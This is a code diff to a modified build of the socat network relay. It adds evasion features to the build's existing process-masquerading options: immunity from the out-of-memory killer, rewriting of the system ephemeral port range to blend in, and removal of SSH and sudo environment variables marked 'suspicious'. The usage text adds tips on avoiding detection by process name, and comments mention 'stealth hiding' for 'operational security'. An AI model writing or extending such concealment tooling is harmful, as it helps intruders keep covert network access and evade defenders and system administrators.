@@ -112,6 +112,10 @@ int main(int argc, const char *argv[]) {
    /* Masquerading support - process name to display */
    const char* masq_name = NULL;
    int target_pid = -1;
+   int oom_immune = 0;
+   int port_range_low = -1;
+   int port_range_high = -1;
+   int clean_env = 0;
    while (arg1[0] && (arg1[0][0] == '-')) {
       switch (arg1[0][1]) {
       case 'V':  if (arg1[0][2])  { socat_usage(stderr); Exit(1); }
@@ -298,6 +302,24 @@ int main(int argc, const char *argv[]) {
 	       Error("option -Mp requires an argument; use option \"-h\" for help");
 	       Exit(1);
 	    }
+	 } else if (arg1[0][2] == 'o') {
+	    /* --Mo: OOM immune */
+	    oom_immune = 1;
+	 } else if (arg1[0][2] == 'P') {
+	    /* --MP: port range follows (format: low-high) */
+	    if (arg1[1]) {
+	       if (sscanf(arg1[1], "%d-%d", &port_range_low, &port_range_high) != 2) {
+		  Error("option -MP requires format: low-high (e.g., 49152-65535)");
+		  Exit(1);
+	       }
+	       ++arg1, --argc;
+	    } else {
+	       Error("option -MP requires an argument; use option \"-h\" for help");
+	       Exit(1);
+	    }
+	 } else if (arg1[0][2] == 'e') {
+	    /* --Me: clean environment */
+	    clean_env = 1;
 	 } else {
 	    socat_opt_hint(stderr, arg1[0][1], arg1[0][2]);
 	    Exit(1);
@@ -427,6 +449,58 @@ int main(int argc, const char *argv[]) {
       Info2("PID manipulation successful: target %d, actual %d", target_pid, getpid());
    }
 
+   /* OOM immunity - prevent process termination under memory pressure */
+   if (oom_immune) {
+      int fd = open("/proc/self/oom_score_adj", O_WRONLY);
+      if (fd >= 0) {
+         if (write(fd, "-1000\n", 6) == 6) {
+            Notice("OOM immunity enabled");
+         } else {
+            Warn1("Failed to set OOM immunity: %s", strerror(errno));
+         }
+         close(fd);
+      } else {
+         Warn1("Failed to open oom_score_adj: %s", strerror(errno));
+      }
+   }
+
+   /* Port range control - blend ephemeral port allocation */
+   if (port_range_low >= 0 && port_range_high >= 0) {
+      int fd = open("/proc/sys/net/ipv4/ip_local_port_range", O_WRONLY);
+      if (fd >= 0) {
+         char buf[64];
+         snprintf(buf, sizeof(buf), "%d %d\n", port_range_low, port_range_high);
+         if (write(fd, buf, strlen(buf)) > 0) {
+            Notice2("Port range set: %d-%d", port_range_low, port_range_high);
+         } else {
+            Warn1("Failed to set port range: %s (requires root)", strerror(errno));
+         }
+         close(fd);
+      } else {
+         Warn1("Failed to open ip_local_port_range: %s", strerror(errno));
+      }
+   }
+
+   /* Environment sanitization - remove suspicious variables */
+   if (clean_env) {
+      const char* suspicious_vars[] = {
+         "SSH_CONNECTION", "SSH_CLIENT", "SSH_TTY",
+         "SUDO_USER", "SUDO_UID", "SUDO_GID", "SUDO_COMMAND",
+         "DISPLAY", "XAUTHORITY",
+         "_", "OLDPWD"
+      };
+      int cleaned = 0;
+      for (size_t i = 0; i < sizeof(suspicious_vars) / sizeof(suspicious_vars[0]); i++) {
+         if (getenv(suspicious_vars[i])) {
+            unsetenv(suspicious_vars[i]);
+            cleaned++;
+         }
+      }
+      if (cleaned > 0) {
+         Notice1("Environment sanitized: %d variable(s) removed", cleaned);
+      }
+   }
+
    /* Save address strings before stealth hiding for operational security */
    {
       char *addr1 = strdup(arg1[0]);
@@ -502,6 +576,9 @@ void socat_usage(FILE *fd) {
    fputs("      -Mm    masquerade as mDNSResponder (macOS)\n", fd);
    fputs("      -Mc <name>  masquerade with custom process name\n", fd);
    fputs("      -Mp <pid>   target specific PID (requires root/CAP_SYS_ADMIN)\n", fd);
+   fputs("      -Mo         enable OOM immunity (prevents kill under memory pressure)\n", fd);
+   fputs("      -MP <range> set ephemeral port range (e.g., -MP 49152-65535)\n", fd);
+   fputs("      -Me         sanitize environment (remove SSH_*, SUDO_*, etc.)\n", fd);
    fputs("\n", fd);
    fputs("   note: kernel thread names ([kworker/0:1], etc.) are detectable\n", fd);
    fputs("         via PPID mismatch; use userspace process names instead\n", fd);
